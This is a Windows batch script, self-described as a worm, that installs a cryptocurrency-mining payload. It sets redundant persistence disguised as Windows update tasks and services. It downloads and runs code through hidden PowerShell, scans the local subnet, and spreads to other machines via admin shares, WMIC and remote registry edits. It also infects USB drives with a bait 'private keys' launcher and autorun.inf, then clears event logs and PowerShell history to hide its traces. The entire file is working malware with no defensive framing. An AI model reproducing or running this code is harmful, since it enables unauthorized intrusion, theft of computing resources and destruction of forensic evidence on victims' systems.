@echo off
setlocal enabledelayedexpansion

rem === MXR WORM FULL v1.0 - Complete Propagation and Persistence ===
rem This file will be hosted remotely and downloaded by dropper

rem Generate random session ID for this execution
set /a "sid=%random%%%9999"
set "tmp=%temp%\sys!sid!"

rem Check if already running to prevent multiple instances
tasklist | findstr /i "worm_full.bat" >nul && exit /b

rem Detect admin privileges
net session >nul 2>&1
if %errorlevel% == 0 (set ADMIN=1) else (set ADMIN=0)

rem === SIGNATURE EVASION TECHNIQUES ===
:obfuscate_strings
rem Dynamically build sensitive strings to avoid static detection
set "s1=Soft"
set "s2=ware"
set "s3=Micro"
set "s4=soft"
set "s5=Wind"
set "s6=ows"
set "regpath=HKLM\!s1!!s2!\!s3!!s4!\!s5!!s6!\CurrentVersion\Run"
set "startup=%APPDATA%\!s3!!s4!\!s5!!s6!\Start Menu\Programs\Startup"

rem Get URLs from dropper parameters
set "payload_url=%~1"
set "worm_url=%~2"

rem Validate URLs are provided
if not defined payload_url (
    echo Error: No payload URL provided
    exit /b 1
)
if not defined worm_url (
    echo Error: No worm URL provided
    exit /b 1
)

rem === MAIN EXECUTION FLOW ===
rem Check if already infected (payload running)
tasklist | findstr /i "xmrig.exe" >nul
if %errorlevel% == 0 (
    rem Already infected - go to propagation only mode
    goto propagation_service_mode
)

rem First infection - setup everything
call :set_persistence
call :execute_payload_immediate
rem Schedule cleanup after initial setup
start /min cmd /c "timeout 300 >nul & call :cleanup_after_infection"

:propagation_service_mode
rem Run as continuous propagation service
call :start_propagation_service
exit /b

:start_propagation_service
rem Continuous propagation loop - runs as service
call :obfuscate_strings
:service_loop
call :scan_network
call :spread_to_targets
call :usb_propagation
timeout 1800 >nul
goto service_loop

rem === PERSISTENCE ESTABLISHMENT ===
:set_persistence
rem Multiple persistence methods for redundancy

rem Ensure variables are set
if not defined regpath set "regpath=HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
if not defined startup set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Method 1: Registry Run key (User)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdateService" /d "\"%~0\" \"%payload_url%\" \"%worm_url%\"" /f >nul 2>&1

rem Method 2: Registry Run key (System - if admin)
if %ADMIN% == 1 (
    reg add "!regpath!" /v "SystemUpdateService" /d "\"%~0\" \"%payload_url%\" \"%worm_url%\"" /f >nul 2>&1
)

rem Method 3: Startup folder
copy "%~0" "!startup!\system_check.bat" >nul 2>&1

rem Method 4: Scheduled task
schtasks /create /tn "MicrosoftUpdateCheck" /tr "\"%~0\" \"%payload_url%\" \"%worm_url%\"" /sc onlogon /f >nul 2>&1
schtasks /create /tn "SystemMaintenanceTask" /tr "\"%~0\" \"%payload_url%\" \"%worm_url%\"" /sc minute /mo 45 /f >nul 2>&1

rem Method 5: Service (if admin) - Run worm_full as service for continuous propagation
if %ADMIN% == 1 (
    rem Copy worm_full to system location for service
    copy "%~0" "%WINDIR%\System32\WinUpdateSvc.bat" >nul 2>&1
    
    rem Create service with both URLs as parameters
    sc create "WinUpdateSvc" binPath= "cmd /c \"%WINDIR%\System32\WinUpdateSvc.bat\" \"%payload_url%\" \"%worm_url%\"" start= auto >nul 2>&1
    sc start "WinUpdateSvc" >nul 2>&1
    
    rem Also copy dropper to system location
    if exist "%tmp%\system_update.exe" (
        copy "%tmp%\system_update.exe" "%WINDIR%\System32\system_update.exe" >nul 2>&1
    )
)

exit /b

rem === IMMEDIATE PAYLOAD EXECUTION ===
:execute_payload_immediate
set "local_payload=%tmp%_payload.bat"
set "cleanup_script=%tmp%_cleanup.bat"

rem Download video_privado.bat (mining payload)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '!payload_url!' -OutFile '!local_payload!' -UseBasicParsing" >nul 2>&1

if exist "!local_payload!" (
    rem Create smart cleanup script
    (
    echo @echo off
    echo timeout 60 ^>nul
    echo :wait_loop
    echo tasklist /fi "imagename eq cmd.exe" ^| findstr /c:"!local_payload!" ^>nul
    echo if errorlevel 1 goto cleanup
    echo timeout 30 ^>nul
    echo goto wait_loop
    echo :cleanup
    echo del "!local_payload!" ^>nul 2^>^&1
    echo del "%%~0" ^>nul 2^>^&1
    ) > "!cleanup_script!"
    
    rem Execute payload immediately in background
    start /min cmd /c "\"!local_payload!\""
    
    rem Start cleanup monitor in background
    start /min cmd /c "\"!cleanup_script!\""
)
exit /b

rem === PROPAGATION MODE ===
if "%1"=="propagate_only" goto start_propagation
exit /b

:start_propagation
call :obfuscate_strings
call :scan_network
call :spread_to_targets
call :usb_propagation
call :continuous_spread
exit /b

rem === NETWORK DISCOVERY ===
:scan_network
set "targets=%tmp%_targets.txt"
if exist "!targets!" del "!targets!"

rem Get local IP range
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
    set "ip=%%a"
    set "ip=!ip: =!"
    if defined ip (
        for /f "tokens=1,2,3,4 delims=." %%b in ("!ip!") do (
            set "subnet=%%b.%%c.%%d"
            goto scan_range
        )
    )
)

:scan_range
rem Fast ping sweep of local subnet
for /L %%i in (1,1,254) do (
    ping -n 1 -w 100 !subnet!.%%i >nul 2>&1
    if !errorlevel! equ 0 (
        echo !subnet!.%%i >> "!targets!"
    )
)
exit /b

rem === LATERAL MOVEMENT ===
:spread_to_targets
if not exist "!targets!" exit /b

rem Check if targets file has content
for %%F in ("!targets!") do if %%~zF==0 exit /b

rem Read targets from file correctly
for /f "usebackq delims=" %%i in ("!targets!") do (
    call :infect_target %%i
)
exit /b

:infect_target
set "target=%1"
if "%target%"=="" exit /b

rem Skip localhost
if "%target%"=="%COMPUTERNAME%" exit /b
if "%target%"=="127.0.0.1" exit /b

rem Test connectivity first
ping -n 1 -w 1000 %target% >nul 2>&1
if !errorlevel! neq 0 exit /b

set "remote_path=\\%target%\C$\Windows\Temp"
set "remote_file=!remote_path!\svchost_update.bat"

rem Vector 1: Copy compiled dropper if available (check multiple locations)
set "dropper_source="
if exist "%WINDIR%\System32\system_update.exe" (
    set "dropper_source=%WINDIR%\System32\system_update.exe"
) else if exist "%tmp%\system_update.exe" (
    set "dropper_source=%tmp%\system_update.exe"
) else if exist "system_update.exe" (
    set "dropper_source=system_update.exe"
)

if defined dropper_source (
    copy "!dropper_source!" "\\%target%\C$\Windows\Temp\system_update.exe" >nul 2>&1
    if !errorlevel! equ 0 (
        rem Execute dropper directly
        wmic /node:%target% process call create "C:\Windows\Temp\system_update.exe" >nul 2>&1
        
        rem Add registry entry for persistence
        reg add "\\%target%\HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /d "C:\Windows\Temp\system_update.exe" /f >nul 2>&1
        
        rem Add scheduled task as backup
        schtasks /s %target% /create /tn "WindowsUpdateCheck" /tr "C:\Windows\Temp\system_update.exe" /sc onlogon /f >nul 2>&1
        
        exit /b
    )
)

rem Vector 2: Fallback - copy dropper.bat if exe not available
if exist "dropper.bat" (
    copy "dropper.bat" "\\%target%\C$\Windows\Temp\svchost_update.bat" >nul 2>&1
    if !errorlevel! equ 0 (
        wmic /node:%target% process call create "C:\Windows\Temp\svchost_update.bat" >nul 2>&1
        reg add "\\%target%\HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /d "C:\Windows\Temp\svchost_update.bat" /f >nul 2>&1
        exit /b
    )
)

rem Vector 3: Alternative paths if C$ fails
if exist "system_update.exe" (
    copy "system_update.exe" "\\%target%\ADMIN$\Temp\system_update.exe" >nul 2>&1
    if !errorlevel! equ 0 (
        wmic /node:%target% process call create "C:\Windows\Temp\system_update.exe" >nul 2>&1
        exit /b
    )
)

rem Vector 4: Try direct PowerShell download on remote machine with both URLs
rem Uses URLs passed from dropper - no hardcoded URLs needed!
wmic /node:%target% process call create "powershell -c \"iwr '%worm_url%' -o $env:temp\sys.bat; & $env:temp\sys.bat '%payload_url%' '%worm_url%'\"" >nul 2>&1

exit /b

rem === USB PROPAGATION ===
:usb_propagation
rem Monitor for USB drives and auto-infect with stealth
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        rem Check if it's a removable drive
        fsutil fsinfo drivetype %%d: | findstr "Removable" >nul
        if !errorlevel! equ 0 (
            call :infect_usb %%d:
        )
    )
)
exit /b

:infect_usb
set "usb_drive=%1"
set "launcher_name=Claves_privadas.txt.bat"
set "dropper_name=system_update.exe"
set "decoy_name=Office.exe"

rem Create hidden system folder
mkdir "%usb_drive%\System Volume Information" >nul 2>&1
attrib +h +s "%usb_drive%\System Volume Information" >nul 2>&1

rem Generate launcher with social engineering bait
(
echo @echo off
echo rem Este archivo parece un documento de texto pero ejecuta el dropper
echo.
echo rem Mostrar mensaje de señuelo primero
echo echo Cargando documentos privados...
echo timeout 2 ^>NUL
echo.
echo rem Crear archivo de texto señuelo para mostrar
echo ^(
echo echo ==========================================
echo echo    CLAVES PRIVADAS - CONFIDENCIAL
echo echo ==========================================
echo echo.
echo echo Bitcoin Wallet: 1A2B3C4D5E6F7G8H9I0J...
echo echo Ethereum Wallet: 0x1234567890abcdef...
echo echo.
echo echo ==========================================
echo ^) ^> "%%TEMP%%\claves_privadas.txt"
echo.
echo rem Abrir el archivo señuelo
echo start notepad "%%TEMP%%\claves_privadas.txt"
echo.
echo rem Ejecutar el DROPPER en segundo plano ^(silencioso^)
echo if exist "%%~dp0%dropper_name%" ^(
echo     start /min "%%~dp0%dropper_name%"
echo ^) else ^(
echo     rem Fallback: download and execute dropper directly
echo     powershell -WindowStyle Hidden -Command "iwr 'https://raw.githubusercontent.com/user123/repo456/main/dropper.bat' -o $env:temp\sys.bat; cmd /c $env:temp\sys.bat"
echo ^)
echo.
echo rem Limpiar después de 30 segundos
echo timeout 30 ^>NUL
echo del "%%TEMP%%\claves_privadas.txt" ^>NUL 2^>NUL
) > "%usb_drive%\%launcher_name%"
attrib +h "%usb_drive%\%launcher_name%" >nul 2>&1

rem Copy dropper executable if available (compiled version)
if exist "system_update.exe" (
    copy "system_update.exe" "%usb_drive%\%dropper_name%" >nul 2>&1
    attrib +h "%usb_drive%\%dropper_name%" >nul 2>&1
)

rem Create decoy executable (empty file with exe extension)
echo. > "%usb_drive%\%decoy_name%"
attrib +h "%usb_drive%\%decoy_name%" >nul 2>&1

rem Create comprehensive autorun.inf
(
echo [AutoRun]
echo open=%launcher_name%
echo icon=shell32.dll,4
echo label=Documentos Importantes
echo action=Ver documentos privados
echo shell\open\command=%launcher_name%
echo shell\explore\command=explorer.exe
echo UseAutoPlay=1
) > "%usb_drive%\autorun.inf"

rem Hide autorun.inf with system attributes
attrib +h +s +r "%usb_drive%\autorun.inf" >nul 2>&1

rem Hide all files to make USB appear empty
for /f "delims=" %%f in ('dir /b "%usb_drive%\" 2^>nul') do (
    if not "%%f"=="System Volume Information" (
        attrib +h "%usb_drive%\%%f" >nul 2>&1
    )
)

exit /b

rem === CONTINUOUS PROPAGATION ===
:continuous_spread
rem Continue spreading in background every 30 minutes
set /a "cycles=0"
:spread_loop
set /a "cycles+=1"
if !cycles! gtr 48 exit /b
timeout 1800 >nul
call :scan_network
call :spread_to_targets
call :usb_propagation
goto spread_loop

rem === CLEANUP AFTER INFECTION ===
:cleanup_after_infection
rem Clear event logs if possible
wevtutil cl System >nul 2>&1
wevtutil cl Security >nul 2>&1
wevtutil cl Application >nul 2>&1

rem Clear temp files and payload remnants (but keep dropper for propagation)
del "%tmp%\*_targets.txt" >nul 2>&1
del "%tmp%\*_payload*.bat" >nul 2>&1
del "%tmp%\*_cleanup*.bat" >nul 2>&1
rem Keep system_update.exe and dropper.bat for continuous propagation
rem del "%tmp%\system_update.exe" >nul 2>&1
rem del "%tmp%\dropper.bat" >nul 2>&1

rem Clear PowerShell history if exists
del "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >nul 2>&1

rem Clear recent documents
del "%APPDATA%\Microsoft\Windows\Recent\*" >nul 2>&1

rem Clear browser cache and temp internet files
del "%LOCALAPPDATA%\Microsoft\Windows\INetCache\*" /s /q >nul 2>&1
del "%LOCALAPPDATA%\Temp\*" /s /q >nul 2>&1

rem Do NOT self-destruct - worm_full needs to persist for continuous propagation
rem timeout 10 >nul
rem del "%~0" >nul 2>&1

exit /b

rem === LEGACY CLEANUP (for background processes) ===
:cleanup
call :cleanup_after_infection
exit /b
